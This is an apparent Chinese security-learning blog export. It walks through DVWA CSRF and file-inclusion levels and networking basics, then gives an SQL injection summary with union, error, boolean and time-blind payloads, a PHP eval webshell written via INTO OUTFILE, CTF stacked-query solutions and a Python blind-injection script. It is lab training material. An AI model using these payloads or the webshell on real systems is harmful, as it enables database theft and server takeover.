src="/./img/164.png"><br>从有源码中，可以知道，服务器收到修改密码的请求后，会检查参数$pass_new与$pass_conf是否相同，如果相同就会修改密码，并且没有任何的防csrf机制<br>我们就直接在URL中修改内容:<br><code>http://www.dvwa.test/vulnerabilities/csrf/?password_new=abcd&amp;password_conf=abcd&amp;Change=Change#</code><br>(必须使用同一个浏览器，因为在访问页面时通常存在cookie认证，否则即使点击了恶意链接也没用)<br>密码有效<br><img src="/./img/165.png"><br>所以在这种情况下我们可以使用短链接包装一下上面的链接诱骗受害者点击，然后密码就会被自动修改</p><h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>直接修改url，提示请求错误<br><img src="/./img/166.png"><br>尝试修改密码，抓包发现referer<br><img src="/./img/167.png"><br>查看源码，medium级别中通过Referer检查来源，要求Referer中的来源方和host一致才能通过，所以我们需要添加并修改Referer<br><img src="/./img/168.png"><br><img src="/./img/170.png"></p><h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><p>加入了Anti-CSRF token来防范CSRF攻击，即随机生成了一个token，正确时才能通过。<br>如果要绕过这个机制，就要获取token，然后利用受害者的cookie去修改密码<br>这里需要XSS+CSRF来共同完成：<br>找到DVWA中的XSS(stored)模块，在Low中抓包投放js代码<br><code>&lt;iframe src=&quot;../csrf/&quot; onload=alert(frames[0].document.getElementsByName(&#39;user_token&#39;)[0].value)&gt;&lt;/iframe&gt;</code><br>然后就出现了这样一个数据信息<br><img src="/./img/171.png"><br>再点击DVWA Security后弹出token<br><img src="/./img/172.png"><br>构造语句后将这个token添加上，然后回车<br><img src="/./img/173.png"><br><img src="/./img/174.png"></p><h3 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h3><p>可以看到，Impossible级别的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。 </p><h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><h3 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h3><p>没有任何保护措施，可以直接在地址栏中进行文件名传参<br><code>?page=D:/phpStudy/PHPTutorial/WWW/phpinfo.php</code><br><img src="/./img/175.png"></p><h3 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &#x27;page&#x27; ];</span><br><span class="line"></span><br><span class="line">// Input validation验证</span><br><span class="line">$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );</span><br><span class="line">$file = str_replace( array( &quot;../&quot;, &quot;..\\&quot; ), &quot;&quot;, $file );</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>对于http的替换我们可以采用双写绕过，而下面的斜杠主要是针对相对路径文件存储路径，但如果我们采用绝对路径上述过滤也可以成功绕过</p><h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &#x27;page&#x27; ];</span><br><span class="line"></span><br><span class="line">// Input validation</span><br><span class="line">if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123;</span><br><span class="line">    // This isn&#x27;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>fnmatch() 函数：根据指定的模式来匹配文件名或字符串<br>采用file类型地址，那么我们就把我们要输入的地址进行修改<br><code>?page=file:///D:/phpStudy/PHPTutorial/WWW/phpinfo.php</code></li></ul><h3 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &#x27;page&#x27; ];</span><br><span class="line"></span><br><span class="line">// Only allow include.php or file&#123;1..3&#125;.php</span><br><span class="line">if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123;</span><br><span class="line">    // This isn&#x27;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看源代码，发现采用了白名单过滤，规定了传入的文件只能是这几个，那么就杜绝了文件包含漏洞</p><h2 id="交换机和路由器"><a href="#交换机和路由器" class="headerlink" title="交换机和路由器"></a>交换机和路由器</h2><p>1、交换机是用来组建局域网最重要的设备(一个圈打个叉)<br>2、路由器可以让这个局域网(内网)上网，实现连接内网和外网(长方形两条横线)<br>3、交换机、网线、电脑构成局域网<br><img src="/./img/176.png"><br>上面那个是交换机，下面是电脑的网卡插着网线连接着交换机<br>如果这个局域网需要可以上网就需要买路由器,路由器一端连交换机一端连运营商而这几台电脑之间需要能通信就需要有ip地址<br>这里是VMware提供的虚拟交换机<br><img src="/./img/177.png"><br>如果我勾选VMnet1相当于我的虚拟机的网卡连上了交换机，如果另一台虚拟机也连这个交换机就可以做局域网实验<br>IP可以手动配也可以自动，但是企业的ip一般是手动配的不会变</p><h2 id="ip地址"><a href="#ip地址" class="headerlink" title="ip地址"></a>ip地址</h2><p>ip地址就是一个唯一标识，是一段网络编码(二进制)，由32位组成<br>11010010.01001001.10001100.00000110<br>210.73.140.6(便于记忆这样写)<br>常用ip地址都是由32位二进制组成的，最大的ip地址是255.255.255.255最小的ip地址是0.0.0.0</p><h2 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h2><p>有ip的地方必须有子网掩码</p><ul><li>局域网通信规则：在同一个局域网中，所有的ip必须在同一个网段中才可以互相通信，所以在不同的网段需要路由器才能通信，单单有交换机不行</li><li>ip地址的构成：网络位+主机位(网络位相同的ip地址为同一个网段)类比你来自哪里，你叫什么网络位可以是前一位两位三位，而子网掩码就是来确认网络位的，在子网掩码中与255对应的是网络位，与0对应的是主机位，比如255.0.0.0就是将第一个小数点前作为网络位，255和0都是连续的不会出现交替</li><li>每个网段的总称是将ip的主机位置零，表示这个网段<br>eg：<br>ip：10.1.1.1<br>子网掩码：255.255.255.0<br>这个网段表示为10.1.1.0，该网段的广播地址是10.1.1.255，广播地址是指可以直接向这个网段的所有ip地址发送东西，可以视为组播地址的升级版，是该网段的<br>大喇叭，255.255.255.255是全局广播地址，可以向所有网段发送信息，但是现在一些地区已经做了隔断。所有可用地址有254个，除去<strong>主机位全为</strong>0或255的</li></ul><h2 id="IP地址分类-看第一部分区分"><a href="#IP地址分类-看第一部分区分" class="headerlink" title="IP地址分类(看第一部分区分)"></a>IP地址分类(看第一部分区分)</h2><p>国际标准组织ISO定义地址分类：五大类(是以ip地址的第一位区分)</p><blockquote><p>A类：1-126 默认子网掩码：255.0.0.0<br>B类：128-191 默认子网掩码：255.255.0.0<br>C类：192-223 默认子网掩码：255.255.255.0<br>D类：224-239 组播地址<br>E类：240-254 科研使用</p></blockquote><p>这样的定义年代久远了，已经不一定使用默认子网掩码，普通人只能使用前三类，子网掩码可以修改<br>127.0.0.1是回环地址，代表本主机自己，经常用来测试将自己的主机作为服务器是否故障，就ping 127.0.0.1看看是否可以访问</p><p><strong>组播技术</strong><br>和组播地址相对应的是单播地址，就是一个人一个地址，但组播地址就可以给一组人使用，将一组ip地址视为是同一个组播地址，发东西只发给这个ip地址就相当于发给这一组ip地址，这样的组播技术可以节省服务器带宽</p><h2 id="网关-GW"><a href="#网关-GW" class="headerlink" title="网关(GW)"></a>网关(GW)</h2><p>这个整体是内网<br><img src="/./img/176.png"></p><p><img src="/./img/178.png"><br>电脑向别的ip地址发送信息时先会比较自己和对方是否在同一个网段，如果不在同一个网段就直接通过交换机发给对方；如果不在同一网段就得发给路由器，而一般每个网段的第一个或最后一个可用的ip地址作为网关，网关就是整个内网的出口，是通向外网的通道，所以只需要将信息发给网关，网关会去寻找要转发的对象(这里怎么转发就涉及到路由器原理了)。<br>这里的10.1.1.254就是网关,如果只需要在局域网中通信就只需要ip和子网掩码，如果要上网就必须配网关，如果不知道网关就无法和外界通信,一般网关在路由器上<br><img src="/./img/180.png"><br>这里就有配置默认网关<br><img src="/./img/179.png"><br>VM开头的是虚拟的，一般网卡的牌子是realtek和Intel，所以属于我物理机的是以太网</p><h2 id="DNS-域名解析服务器"><a href="#DNS-域名解析服务器" class="headerlink" title="DNS(域名解析服务器)"></a>DNS(域名解析服务器)</h2><p>任何两个PC通信都需要知道对方的ip，当在浏览器上地址栏输入<code>www.jd.com</code>浏览器会先问问自己，即查看有没有匹配的DNS缓存，但如果从来没有访问过就先在本地域名解析文件(host文件)中寻找，如果还没有就求助DNS服务器，所以电脑需要知道DNS服务器的IP，DNS的服务器分布于全球各地，DNS的ip是在公网(互联网)上<br>这里是电脑里的相关配置，这个DNS服务器是北京联通的最通用的一台DNS<br><img src="/./img/181.png"><br>访问过程<br><img src="/./img/182.png"><br>如果所使用的DNS服务器被劫持，使我们输入的域名解析成恶意网站就很危险<br><strong>一些网络测试命令</strong></p><ul><li>ping 测试网络连通性，有去有回，相当于发过去几个探测包，对方有回包<br>这里的时间可以反映网速，如果对方打开防火墙的某些功能也会ping不通<br><img src="/./img/183.png"> </li><li>nslookup 域名(比如<code>www.baidu.com</code>)，手工解析ip地址</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入总结</title>
      <link href="/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93.html"/>
      <url>/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93.html</url>
      
        <content type="html"><![CDATA[<p>sql注入就是在数据交互中，前端数据传到后台时没有做严格的判断，导致传进来的数据被拼接到sql语句中，被当作sql语句的一部分进行执行<br><img src="/img/203.png"></p><h2 id="注入时信息收集"><a href="#注入时信息收集" class="headerlink" title="注入时信息收集"></a>注入时信息收集</h2><p><img src="/img/204.png"><br>mysql的版本5.0以上才有information_schema数据库</p><ul><li>信息收集：<br>查询数据库 version()<br>数据库名字 databaase()<br>数据库用户 user()<br>操作系统 @@version_compile_os</li></ul><p>跨库查询：目标网站的同一个服务器中如果存在一个网站的数据库是使用root权限连接的，且存在sql注入漏洞，就会有被跨库攻击的风险。数据库名存放在information_schema.schemata表中的schema_name字段，查询方式和查表名一致</p><h2 id="mysql基本知识"><a href="#mysql基本知识" class="headerlink" title="mysql基本知识"></a>mysql基本知识</h2><p><img src="/../img/image-20240414154102699.png" alt="image-20240414154102699"></p><p>mysql有个自带的数据库：information_schema，该数据库下面有表：tables和columns和schemata。<br>tables表中有个字段：table_name 是所有数据库存在的表名<br>columns表中有个字段：column_name 是所有列名<br>schemata表中：schema_name 是所有数据库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SHOW TABLES FROM information_schema;</span><br><span class="line"></span><br><span class="line">use database information_schema;</span><br><span class="line">show tables;</span><br></pre></td></tr></table></figure><p><img src="/../img/image-20240414154730234.png" alt="image-20240414154730234"></p><ul><li><p>注释：<code>-- 空格</code> 和<code>#</code></p></li><li><p>SELECT</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT NOW(); //查时间</span><br><span class="line">SELECT DATABASE(); //查看当前数据库</span><br><span class="line">SELECT VERSION(); //查看版本</span><br><span class="line">SELECT USER(); //查看当前登录数据库的用户</span><br><span class="line">SELECT @@datadir; //查看数据路径</span><br><span class="line">SELECT @@basedir; //查看mysql安装路径</span><br><span class="line">SELECT @@version_compile_os; //查看mysql安装的系统</span><br></pre></td></tr></table></figure></li></ul><h2 id="注入点类型判断"><a href="#注入点类型判断" class="headerlink" title="注入点类型判断"></a>注入点类型判断</h2><ul><li>数字型</li><li>字符型<br><strong>数字型判断</strong><br>当输入的参 x 为整型时，通常 abc.php 中 Sql 语句类型大致如下：<br><code>select * from &lt;表名&gt; where id = x</code><br>这种类型可以使用经典的 and 1&#x3D;1 和 and 1&#x3D;2 来判断：</li><li>Url 地址中输入<code>/abc.php?id= x and 1=1 </code>页面依旧运行正常</li><li>Url 地址中继续输入 <code>/abc.php?id= x and 1=2 </code>页面运行错误，则说明此 Sql 注入为数字型注入。</li></ul><p>原因如下：<br>当输入 <code>and 1=1</code>时，后台执行 Sql 语句：<br><code>select * from &lt;表名&gt; where id = x and 1=1</code><br>没有语法错误且逻辑判断为正确，所以返回正常<br>当输入 and 1&#x3D;2时，后台执行 Sql 语句：<br><code>select * from &lt;表名&gt; where id = x and 1=2</code><br>没有语法错误但是逻辑判断为假，所以返回错误<br>我们再使用假设法：如果这是字符型注入的话，我们输入以上语句之后应该出现如下情况：<br><code>select * from &lt;表名&gt; where id = &#39;x and 1=1&#39; </code><br><code>select * from &lt;表名&gt; where id = &#39;x and 1=2&#39;</code><br>查询语句将 and 语句全部转换为了字符串，并没有进行 and 的逻辑判断，所以不会出现以上结果，故假设是不成立的。</p><p><strong>字符型判断</strong></p><ul><li>Url 地址中输入 <code>/abc.php?id= x&#39; and &#39;1&#39;=&#39;1 </code>页面运行正常</li><li>Url 地址中继续输入 <code>/abc.php?id= x&#39; and &#39;1&#39;=&#39;2</code> 页面运行错误，则说明此 Sql 注入为字符型注入。<br>同样可以使用假设法来验证</li></ul><h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p>以下是字符型的情况：<br><strong>1、判断列数</strong><br><code>?id=1&#39;order by 3 --+</code><br><strong>2、判断显示位，就是看哪一列会显示在屏幕上</strong><br><code>?id=-1&#39;union select 1,2,3--+</code><br><strong>3、数据库名</strong><br><code>?id=-1&#39;union select 1,database(),3--+</code><br><strong>4、该数据库下的表名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure><p><strong>5、待查表的字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27;and table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure><p><strong>6、数据</strong><br><code>?id=-1&#39; union select 1,2,group_concat(username ,id , password) from users--+</code></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><ul><li>updatexml()是更新xml文档的函数</li></ul><p>语法：updatexml(目标xml内容，xml文档路径，更新的内容)<br><code>updatexml(1,concat(0x7e,(select database()),0x7e),1)</code><br>实际上这里是去更新xml文档，但是我们在xml文档路径的位置里面写入了子查询，我们输入了特殊字符，因为不符合输入规则所以报错，但是报错的时候其实已经执行了子查询语句，并从报错信息中显示出来</p><p><strong>数据库名</strong><br><code>?id=1&#39; or updatexml(1,concat(&#39;~&#39;,(select database()),&#39;~&#39;),1) --+</code><br><strong>表名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),&#x27;~&#x27;),1) --+</span><br></pre></td></tr></table></figure><p><strong>字段</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27;and table_name=&#x27;users&#x27; limit 1,1),&#x27;~&#x27;),1) --+</span><br></pre></td></tr></table></figure><p><strong>数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select password from users limit 0,1),&#x27;~&#x27;),1) --+</span><br></pre></td></tr></table></figure><p>ps:</p><ul><li>报错一般有长度限制，不能输出太长的数据，尽量不要使用group_concat()</li><li>建议使用or，因为and如果两条语句有一条是false，就会判定为false，如果前面的条件不成立，后面的语句就不会执行<br><strong>报错注入显示不全问题解决</strong></li></ul><p>使用mid函数<br><code>?wllm=1&#39; or updatexml(1,concat(&#39;~&#39;,mid((select group_concat(flag) from test_tb),1,31),&#39;~&#39;),1) --+</code><br><code>?wllm=1&#39; or updatexml(1,concat(&#39;~&#39;,mid((select group_concat(flag) from test_tb),32,31),&#39;~&#39;),1) --+</code>用mid函数包含查询内容，第二个参数规定开始位置，第三个参数是返回的字符个数</p><h2 id="写入读取文件"><a href="#写入读取文件" class="headerlink" title="写入读取文件"></a>写入读取文件</h2><p>在利用sql注入漏洞后期，最常用的就是通过mysql的file系列函数来进行读取敏感文件或者写入webshell，其中比较常用的函数有三个：<br>into dumpfile()、into outfile()、load_file()<br>这些都是需要设置secure_file_priv&#x3D;,如果为空则可以指定任意目录，如果有设置等于某个路径就只能在这个路径下写入，如果为null则禁止导入导出功能<br>可以往里面写马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;))union select 1,&quot;&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;&quot;,3 into outfile &quot;D://phpStudy/PHPTutorial/WWW/sqli-labs-master/Less-7/shell.php&quot; --+</span><br></pre></td></tr></table></figure><p>也可以直接把想要查询的内容导出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;))  union select 1,2,group_concat(username, &quot;~&quot;,password) from users into outfile &quot;D://phpStudy/PHPTutorial/WWW/sqli-labs-master/Less-7/outfile.txt&quot; --+</span><br></pre></td></tr></table></figure><p>常见写入文件问题:魔术引号开关<br>magic_quotes_gpc &#x3D; On时，输入数据中含单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符，都会被加上反斜线，影响文件路径<br>解决方式：16进制编码</p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>没有显错位的时候可以尝试使用盲注的方式<br><strong>下面介绍一些盲注相关的函数</strong><br>length():返回字符串的长度<br>substr():截取字符串<br>ascii():返回字符的ascii码<br>sleep():将程序挂起一段时间<br>if(1,2,3):判断1成立就执行2，不成立就执行3</p><p><strong>数据库长度</strong><br><code>?id=1&#39;and (length(database()))=1 --+</code></p><p><strong>数据库名称</strong><br><code>?id=1&#39;and ascii(substr(database(),1,1))=100 --+</code></p><p><strong>表名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),1,1))=117 --+</span><br></pre></td></tr></table></figure><p><strong>字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))=105--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1)=&#x27;i&#x27; --+</span><br></pre></td></tr></table></figure><p>可以使用字符判断也可以使用字符本身，每个字段名会被隔开，所以中间会有不在a~z范围内的，当然也可以一个一个查</p><p><strong>数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50--+</span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>如果输入什么，页面回显都不变可以考虑使用时间盲注<br><strong>判断参数构造</strong><br><code>?id=1&#39; and if(1=1,sleep(5),1)--+</code></p><p><strong>库名长度</strong><br><code>?id=1&#39;and if(length((select database()))=8,sleep(5),1)--+</code></p><p><strong>数据库名称</strong><br><code>?id=1&#39;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</code></p><p><strong>表名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=100,sleep(5),1)--+</span><br></pre></td></tr></table></figure><p><strong>字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))=100,sleep(5),1)--+</span><br></pre></td></tr></table></figure><p><strong>数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr((select username from users),1,1))=100,sleep(5),1)--+</span><br></pre></td></tr></table></figure><h2 id="post型"><a href="#post型" class="headerlink" title="post型"></a>post型</h2><p>万能密码：’or 1&#x3D;1 #</p><h3 id="联合注入-1"><a href="#联合注入-1" class="headerlink" title="联合注入"></a>联合注入</h3><p><strong>判断列数</strong><br><code>&#39; or 1=1 order by 3#</code><br><strong>判断显示位</strong><br><code>&#39; union select 1,2 #</code><br>后面和get型相同<br>‘union select 1,database()#  </p><h2 id="参数类型"><a href="#参数类型" class="headerlink" title="参数类型"></a>参数类型</h2><p>数字型、字符型，括号尝试<br>搜索框中参数可能是<code>&#39;%查询%&#39;</code>这样的,所以要%的闭合</p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>1’ and 1&#x3D;1 –+<br>1’ and 1&#x3D;2 –+<br>判断出存在sql注入<br>1’order by 3 –+ &#x2F;&#x2F;判断列数是2<br>1’union select 1,2 –+ &#x2F;&#x2F;尝试联合注入<br>回显内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure><p>尝试堆叠注入<br>1’;show databases; –+<br>由上面可知，extractvalue没有被过滤<br><code>1&#39; and extractvalue(1,concat(0x7e,database(),0x7e)) --+</code> &#x2F;&#x2F;显示现在访问的数据库名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error 1105 : XPATH syntax error: &#x27;~supersqli~&#x27;</span><br></pre></td></tr></table></figure><p>是flag所在的数据库，所以直接查看表名<br>0’; show tables; #<br>两个表：words、1919810931114514<br>1’; show columns from words; #<br>1’; show columns from <code>1919810931114514</code>; #  &#x2F;&#x2F;表名是数字的用反引号包裹<br>words:<br><img src="/img/197.png"><br>1919810931114514:<br><img src="/img/198.png"><br>我们需要读取的是第二个表内的flag字段的内容，所以思路是：<br>查询是在words中查询id的，所以我们将表1919810931114514改名为words，将words改名为其余的名字。同时将flag属性改名为id属性，类型为varchar(100)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;;rename table `words` to words2;rename table `1919810931114514` to words;alter table words change flag id varchar(100);#</span><br></pre></td></tr></table></figure><p>第二种方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</span><br></pre></td></tr></table></figure><p>在SQL语句中使用了一个变量@a，并将一个十六进制值赋给了这个变量，使用了prepare语句，将之前赋值给变量@a的十六进制值转换为可执行的SQL语句，执行之前准备好的SQL语句<br>prepare from是预处理语句，会进行编码转换<br>execute用来执行由SQLPrepare创建的SQL语句</p><p>第三种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; handler `1919810931114514` open as `a`; handler `a` read next;#</span><br></pre></td></tr></table></figure><p>将表名1919810931114514通过别名a的方式打开，以别名a的形式读取下一条记录</p><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>输入1或2都有回显，输入其他的会显示error，那么先试一下万能密码<code>1&#39;or 1=1 #</code>,发现回显sql注入检查，所以是有过滤，fuzz测试一下<br><img src="/img/199.png"><br>这些长度一样的都是被过滤的，–+和#都被过滤了<br>输入1’,回显bool(false)，说明提示布尔盲注，两个新姿势：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(1=1,1,2):若第一个成立就指向第二个</span><br><span class="line">0^1：mysql里是亦或</span><br></pre></td></tr></table></figure><p>空格被过滤，所以用()代替<br>然后就是编写脚本了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import re</span><br><span class="line">url=&#x27;http://7b7b80d0-9cb2-4722-aaf7-b1c57e676401.node4.buuoj.cn:81/index.php&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,43):  //range左边是不等于，所以循环42次</span><br><span class="line">    max = 127</span><br><span class="line">    min = 0</span><br><span class="line">    for c in range(0,127):  //理论上大于最多次二分查找就行</span><br><span class="line">        s = (int)((max+min)/2)  //转换为整数，直接舍去小数部分，用于下方的比较</span><br><span class="line">        payload = &#x27;0^(ascii(substr((select(flag)from(flag)),&#x27;+str(i)+&#x27;,1))&gt;&#x27;+str(s)+&#x27;)&#x27;  //str(i)转换为字符串，+是字符串拼接运算符</span><br><span class="line">        r = requests.post(url,data = &#123;&#x27;id&#x27;:payload&#125;)  //发送POST请求，其中id 是传递SQL注入负载的参数名</span><br><span class="line">        time.sleep(0.005)  //添加短暂的延迟，避免频繁请求导致触发安全机制</span><br><span class="line">        if &#x27;Hello, glzjin wants a girlfriend.&#x27; in str(r.content):  //响应内容通常以字节流（bytes）的形式返回，将其转换为字符串以便进行文本匹配和处理</span><br><span class="line">            min=s</span><br><span class="line">        else:</span><br><span class="line">            max=s</span><br><span class="line">        if((max-min)&lt;=1):</span><br><span class="line">            flag+=chr(max)  //转换为字符形式</span><br><span class="line">            print(flag)</span><br><span class="line">            break  </span><br></pre></td></tr></table></figure><p>or updatexml(1,concat(‘<del>‘,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’fakebook’ ),’</del>‘),1)<br>?id&#x3D;1’ or updatexml(1,concat(‘<del>‘,(select group_conca(column_name) from information_schema.columns where table_schema&#x3D;’fakebook’and table_name&#x3D;’users’ ),’</del>‘),1) –+<br>or updatexml(1,concat(‘<del>‘,(select left(passwd,30) from users ),’</del>‘),1) –+</p><h2 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h2><p>1、查询数据库  sqltest<br>一定要跟上注入点的url<br><code>python sqlmap.py -u 